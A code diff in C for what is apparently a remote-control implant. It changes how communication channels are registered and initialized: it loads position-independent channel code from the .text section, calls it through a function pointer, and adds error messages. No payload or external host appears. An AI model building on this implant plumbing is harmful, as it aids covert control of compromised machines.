@@ -6,33 +6,37 @@ PCHANNEL   g_Channel;
 
 // Channel PIC
 //
-__attribute__( ( section( ".text" ) ) ) BYTE g_DefaultChannel[]       = DEFAULT_CHANNEL;
-BYTE                                         g_DefaultChannelConfig[] = DEFAULT_CHANNEL_CONFIG;
+__attribute__( ( section( ".text" ) ) ) BYTE g_DefaultChannel[] = DEFAULT_CHANNEL;
+// BYTE                                         g_DefaultChannelConfig[] = DEFAULT_CHANNEL_CONFIG;
 
 // ChannelInitialize initialize list then insert default channel
 //
 BOOL ChannelInitialize() {
 
+    PCHANNEL Channel = NULL;
+
     InitializeListHead( &g_ChannelList );
 
-    if (!ChannelRegister( g_DefaultChannel, sizeof( g_DefaultChannel ), g_DefaultChannelConfig, sizeof( g_DefaultChannelConfig ) )) {
+    if (!ChannelRegister( g_DefaultChannel, sizeof( g_DefaultChannel ) )) {
         printf( "[-] Failed to register channel\n" );
         return FALSE;
     }
 
-    if (!ChannelSwitch( 0 )) {
+    Channel = CONTAINING_RECORD( g_ChannelList.Flink, CHANNEL, ListEntry );
+    if (!Channel->Interface->Initialize( Channel->Interface->Context )) {
         printf( "[-] Failed to switch to default implant channel\n" );
         return FALSE;
     }
 
+    g_Channel = Channel;
     return TRUE;
 }
 
 // ChannelRegister register new communication channel
 //
-BOOL ChannelRegister( PVOID BaseAddr, DWORD Size, VOID* Config, DWORD ConfigSize ) {
+BOOL ChannelRegister( PVOID BaseAddr, DWORD Size ) {
     PCHANNEL channel = NULL;
-    BOOL ( *ChannelEntrypoint )( IImplant*, IChannel*, VOID*, DWORD );
+    BOOL ( *ChannelEntrypoint )( IImplant*, IChannel* );
 
     channel = (PCHANNEL)HeapAlloc( GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof( CHANNEL ) );
     if (channel == NULL) {
@@ -44,8 +48,8 @@ BOOL ChannelRegister( PVOID BaseAddr, DWORD Size, VOID* Config, DWORD ConfigSize
         return FALSE;
     }
 
-    ChannelEntrypoint = (BOOL ( * )( IImplant*, IChannel*, VOID*, DWORD ))BaseAddr;
-    if (!ChannelEntrypoint( &g_Implant.Interface, channel->Interface, Config, ConfigSize )) {
+    ChannelEntrypoint = (BOOL ( * )( IImplant*, IChannel* ))BaseAddr;
+    if (!ChannelEntrypoint( &g_Implant.Interface, channel->Interface )) {
         return FALSE;
     }
 
@@ -74,6 +78,7 @@ BOOL ChannelSwitch( DWORD ID ) {
 
         if (Channel->Interface->ID == ID) {
             if (!Channel->Interface->Initialize( Channel->Interface->Context )) {
+                printf( "[-] Failed to initialize implant channel: %lX\n", ID );
                 return FALSE;
             }
 
@@ -84,6 +89,7 @@ BOOL ChannelSwitch( DWORD ID ) {
         current = current->Flink;
     }
 
+    printf( "[-] Channel not found\n" );
     return FALSE;
 }
 
